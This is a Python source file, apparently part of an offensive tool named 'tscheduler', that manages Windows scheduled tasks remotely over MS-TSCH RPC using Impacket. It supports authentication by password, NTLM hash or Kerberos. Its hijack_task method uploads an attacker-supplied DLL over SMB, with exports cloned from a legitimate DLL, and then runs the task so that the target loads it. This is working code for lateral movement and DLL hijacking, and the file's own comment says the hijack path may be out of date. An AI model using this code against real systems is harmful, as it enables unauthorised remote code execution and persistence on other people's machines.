from impacket.dcerpc.v5 import tsch, transport
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.smbconnection import SessionError, SMBConnection
from impacket import uuid
from tscheduler import OBJ_EXTRA_FMT, ColorScheme, console
from tscheduler.lib.xmlhandler import XMLHandler
from tscheduler.lib.models import DLLHijack, DLL_HIJACKS
from tscheduler.lib.pyclone import _clone_exports
from hashlib import sha256
from rich import print_json
from io import BufferedReader
from os import remove
from xml.etree import ElementTree as ET
import xmltodict
import pefile
import logging
import json


class TaskHandler:
    '''
    Use Impacket's MS-TSCH implementation to remotely manage scheduled tasks
    '''
    def __init__(self, path=None, username='', password='', domain='', target='', lmhash=None, nthash=None, aesKey=None, doKerberos=False, kdcHost=None, outfile=None):
        self.__path = path
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__target = target
        self.__lmhash = lmhash
        self.__nthash = nthash
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__dce = None
        self.__output_file = 'tasks.xml'
        self.__taskconfig_file = 'configs.xml'
        self.__reference_dll = None

        if self.__path is not None:
            self._format_path()

        try:
            self._connect()
        except SessionError as e:
            if 'STATUS_LOGON_FAILURE' in str(e):
                logging.error('STATUS_LOGON_FAILURE - Invalid credentials')
            else:
                logging.error(str(e))
            exit()
        except Exception as e:
            logging.error(f'Encountered unexpected error during authentication - {str(e)}')
            exit()

    
    @staticmethod
    def format_path(path):
        if path.startswith('\\'):
            return path
        else:
            return f'\\{path}'
        

    def _connect(self):
        logging.info('Initiating RPC bind')
        stringbinding = r'ncacn_np:%s[\pipe\atsvc]' % self.__target
        rpctransport = transport.DCERPCTransportFactory(stringbinding)

        if hasattr(rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey)
            rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)

        self.__dce = rpctransport.get_dce_rpc()

        self.__dce.set_credentials(*rpctransport.get_credentials())
        if self.__doKerberos is True:
            logging.debug('Setting Kerberos auth type')
            self.__dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
       
        self.__dce.connect()
        self.__dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        self.__dce.bind(tsch.MSRPC_UUID_TSCHS)
        logging.debug('RPC bind successful')

    
    def disconnect(self):
        '''
        Disconnect the RPC transport
        '''
        logging.debug('Disconnecting RPC transport')
        self.__dce.disconnect()

    
    def _format_path(self):
        if self.__path.endswith('\\') and len(self.__path) > 1:
            self.__path = self.__path[:-1]
            logging.warning('Removed trailing backslash from provided path')


    def _rpc_enum_path(self, folder):
        resp = tsch.hSchRpcEnumTasks(self.__dce, folder.path)
        for task in resp['pNames']:
            name = task['Data'][:-1]
            folder.tasks.append(name)
            logging.info(f'Identified task {ColorScheme.task}{name}[/] in {ColorScheme.folder}{folder.path}', extra=OBJ_EXTRA_FMT)
            self.__path = f'{folder.path}{name}' if folder.path[-1:] == '\\' else f'{folder.path}\\{name}'
            xml = self.enum_task(xml=True, output=False)
            with open(self.__taskconfig_file, 'a') as f:
                f.write(xml.split('\n',1)[1][:-1])
        
        resp = tsch.hSchRpcEnumFolders(self.__dce, folder.path)
        for subfolder in resp['pNames']:    
            name = subfolder['Data'][:-1]
            if folder.path == TaskFolder.TASK_ROOT:
                path = folder.path + name
            else:
                path = f'{folder.path}\\{name}'
            sub = TaskFolder(name, path)
            folder.subfolders.append(sub)
            logging.debug(f'Identified subfolder {ColorScheme.folder}{name}[/] in {ColorScheme.folder}{folder.path}', extra=OBJ_EXTRA_FMT)
        for subfolder in folder.subfolders:
            self._rpc_enum_path(subfolder)
            

    def enum_all_tasks(self):
        '''
        Dump a mapping of all tasks and task folders to a JSON file
        '''
        with open(self.__taskconfig_file, 'w') as f:
            f.write('<?xml version="1.0" encoding="UTF-16"?>\n<Tasks>\n')

        root = TaskFolder('ROOT', TaskFolder.TASK_ROOT)
        self._rpc_enum_path(root)
        with open(self.__output_file, 'w') as f:
            f.write(root.toJSON())

        with open(self.__taskconfig_file, 'a') as f:
            f.write('\n</Tasks>')

        logging.info(f'Task names and folders dumped to ./{self.__output_file}')
        logging.info(f'Task XML configs dumped to ./{self.__taskconfig_file}')

    
    def enum_task(self, xml=True, output=True):
        '''
        Enumerate a task's state, running instances and jump configs to JSON or XML
        '''
        self._get_task_state()
        self._get_task_instances()
        resp = tsch.hSchRpcRetrieveTask(self.__dce, self.__path)

        if xml:
            if output:
                logging.info('Dumping task config')
                print()
                console.print(resp['pXml'])
                fname = self.__path.split('\\')[-1] + '.xml'
                with open(fname, 'w') as f:
                    f.write(resp['pXml'][:-1])
                print()
                logging.info(f'Task XML config dumped to ./{fname}')
        else:
            xparsed = xmltodict.parse(resp['pXml'][:-1])
            print_json(json.dumps(xparsed))

        return resp['pXml']
        

    def run_task(self, session_id=0):
        '''
        Queue a task for execution
        '''
        try:
            resp = tsch.hSchRpcRun(self.__dce, self.__path, sessionId=session_id)
            logging.info(f'Task started: {ColorScheme.task}{self.__path}[/]', extra=OBJ_EXTRA_FMT)
        except (tsch.DCERPCSessionError, tsch.DCERPCException) as e:
            if 'ERROR_FILE_NOT_FOUND' in str(e):
                logging.error(f'ERROR_FILE_NOT_FOUND - Invalid task path')
            elif '0x80041326' in str(e):
                logging.error(f'Task failed to start with error code 0x80041326 - is task enabled?')
            else:
                logging.error(str(e))
            exit()
        #self._get_task_state()

    
    def stop_task(self):
        '''
        Stop a running task
        '''
        try:
            resp = tsch.hSchRpcStop(self.__dce, self.__path)
            logging.info(f'Task stopped: {self.__path}')
        except (tsch.DCERPCSessionError, tsch.DCERPCException) as e:
            if 'ERROR_FILE_NOT_FOUND' in str(e):
                logging.error(f'ERROR_FILE_NOT_FOUND - Invalid task path')
            elif '0x80041326' in str(e):
                logging.error(f'Task failed to start with error code 0x80041326 - is task enabled?')
            elif 'ERROR_INVALID_FUNCTION' in str(e):
                logging.error(str(e))
                logging.error('Task may not be in RUNNING state')
            else:
                logging.error(str(e))
            exit()
        #self._get_task_state()

    
    def enum_folder(self):
        '''
        Enumerate the tasks and subfolders in a folder
        '''
        try:
            contents = {
                'tasks': [],
                'subfolders': []
            }
            resp = tsch.hSchRpcEnumTasks(self.__dce, self.__path)
            task_count = len(resp['pNames'])
            logging.info(f'Identified {task_count} tasks in {ColorScheme.folder}{self.__path}', extra=OBJ_EXTRA_FMT)
            for task in resp['pNames']:
                contents['tasks'].append(task['Data'][:-1])
            
            resp = tsch.hSchRpcEnumFolders(self.__dce, self.__path)
            folder_count = len(resp['pNames'])
            logging.info(f'Identified {folder_count} subfolders in {ColorScheme.folder}{self.__path}\n', extra=OBJ_EXTRA_FMT)
            for subfolder in resp['pNames']:
                contents['subfolders'].append(subfolder['Data'][:-1])
            print_json(json.dumps(contents))
        except (tsch.DCERPCSessionError, tsch.DCERPCException) as e:
            if 'ERROR_FILE_NOT_FOUND' in str(e):
                logging.error(f'ERROR_FILE_NOT_FOUND - Invalid task path')
            else:
                logging.error(str(e))
            exit()

    
    def _get_task_instances(self):
        try:
            resp = tsch.hSchRpcEnumInstances(self.__dce, self.__path)
        except (tsch.DCERPCSessionError, tsch.DCERPCException) as e:
            if 'ERROR_FILE_NOT_FOUND' in str(e):
                logging.error(f'ERROR_FILE_NOT_FOUND - Invalid task path')
            else:
                logging.error(str(e))
            exit()

        logging.info(f'Found {len(resp["pGuids"])} running instances')
        for idx, guid in enumerate(resp['pGuids']):
            logging.debug(f'Instance {idx + 1} GUID: {uuid.bin_to_string(guid["Data"])}')


    def _get_task_state(self):
        try:
            resp = tsch.hSchRpcGetTaskInfo(self.__dce, self.__path)
        except (tsch.DCERPCSessionError, tsch.DCERPCException) as e:
            if 'ERROR_FILE_NOT_FOUND' in str(e):
                logging.error(f'ERROR_FILE_NOT_FOUND - Invalid task path')
            else:
                logging.error(str(e))
            exit()
        
        # resp['pState'] should return task state (RUNNING, READY, QUEUED, DISABLED)
        # but seems to always return 0 for me - should be checked here but
        # workaround is the _get_task_instances() func 

        if resp['pEnabled'] == 1:
            logging.info('Task is ENABLED')
            return 1
        else:
            logging.info('Task is DISABLED')
            return 0

    
    def enable_task(self, enable=True):
        '''
        Enable or disable a task
        '''
        # check tasks initial enable/disable status
        enabled = self._get_task_state()

        # if no change required, return
        if enable and enabled == 1:
            logging.warning('Task is already enabled! Exiting...')
            return
        if not enable and enabled == 0:
            logging.warning('Task is already disabled! Exiting...')
            return
        
        action = 'Enabling' if enable else 'Disabling'
        logging.info(f'{action} task {ColorScheme.task}{self.__path}', extra=OBJ_EXTRA_FMT)

        # change time
        resp = tsch.hSchRpcEnableTask(self.__dce, self.__path, enable)
        if resp['ErrorCode'] != 0:
            logging.critical(f'RPC call returned error code {resp["ErrorCode"]} - change may have failed')

        # check task enabled/disabled after change
        self._get_task_state()


    def create_task(self, xml=None, path=None, update=False):
        '''
        Register a new task or update an existing one
        '''
        if path is None:
            path = self.__path

        #
        # To modify an existing task, the TASK_UPDATE flag must be set
        #  https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/3b0f409e-b42e-4528-b746-417da9e335dc
        #
        flags = tsch.TASK_CREATE if not update else tsch.TASK_UPDATE

        # attempt to register the task
        try:
            resp = tsch.hSchRpcRegisterTask(self.__dce, path, xml, flags, NULL, tsch.TASK_LOGON_NONE)
            logging.info(f'Task created: {ColorScheme.task}{self.__path}[/]', extra=OBJ_EXTRA_FMT)
        except (tsch.DCERPCSessionError, tsch.DCERPCException) as e:
            logging.error(str(e))
            exit()

    def delete_task(self):
        '''
        Delete a task
        '''
        try:
            resp = tsch.hSchRpcDelete(self.__dce, self.__path)
            logging.info(f'Task deleted: {ColorScheme.task}{self.__path}[/]', extra=OBJ_EXTRA_FMT)
        except (tsch.DCERPCSessionError, tsch.DCERPCException) as e:
            if 'ERROR_FILE_NOT_FOUND' in str(e):
                logging.error(f'ERROR_FILE_NOT_FOUND - Invalid task path')
            else:
                logging.error(str(e))
            exit()

    
    def _answer(self, data):
        '''
        Callback function for SMBConnection.getFile()
        '''
        self.__reference_dll = data

    #
    # no idea if this works anymore, associated command/module is commented out
    #
    def hijack_task(self, hijack: DLLHijack, dll: BufferedReader):
        '''
        Upload provided DLL to target and start hijackable task
        '''
        # get dict object containing specified hijack info
        hijack_info = DLL_HIJACKS[hijack.value]

        # set TaskHandler task path
        self.__path = hijack_info.task

        # prep connection for dll upload and download, if hijack has a reference
        logging.debug('Initiating SMB connection for file upload/download')
        try:
            smb_conn = SMBConnection(self.__target, self.__target, sess_port=445)
            if self.__doKerberos:
                smb_conn.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey, self.__kdcHost)
            else:
                smb_conn.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
        except Exception as e:
            logging.error(e)
            

        try:
            dll_bytes = dll.read()
            #dll_bytes = open(dll.name, 'rb').read()

            # if hijack has a reference DLL, download it
            if hijack_info.reference:
                smb_conn.getFile('C$', hijack_info.reference[3:], self._answer)
                logging.debug(f'Downloaded legit {hijack_info.reference} from target')

                # from PyClone
                target_pe = pefile.PE(data=dll_bytes)
                reference_pe = pefile.PE(data=self.__reference_dll)

                cloned_pe = _clone_exports(target_pe, reference_pe, hijack_info.reference, '.rdata2')
                dll_bytes = cloned_pe.write()
                logging.info(f'Cloned exports to provided dll')       

            # this is ugly - write cloned dll or original dll to disk
            # so we can use .read() as putFiles callback func
            tmp_name = f'{dll.name}.tmp'
            open(tmp_name, 'wb').write(dll_bytes)
            fh = open(tmp_name, 'rb')     

            smb_conn.putFile('C$', hijack_info.path[3:], fh.read)
            fh.close()
            logging.info(f'Uploaded {dll.name} to {hijack_info.path}')
            logging.debug(f'SHA256 of uploaded DLL: {sha256(dll_bytes).hexdigest()}')
            remove(tmp_name)
            
            # kick the task to trigger the hijack
            self.run_task()
        except Exception as e:
            logging.error(e)
            smb_conn.close()


# used for -enum-all
class TaskFolder:
    TASK_ROOT = '\\'

    def __init__(self, name, path):
        self.name = name
        self.path = path
        self.tasks = []
        self.subfolders = []

    def toJSON(self):
        return json.dumps(self, default=lambda o: o.__dict__, sort_keys=True, indent=4)
         
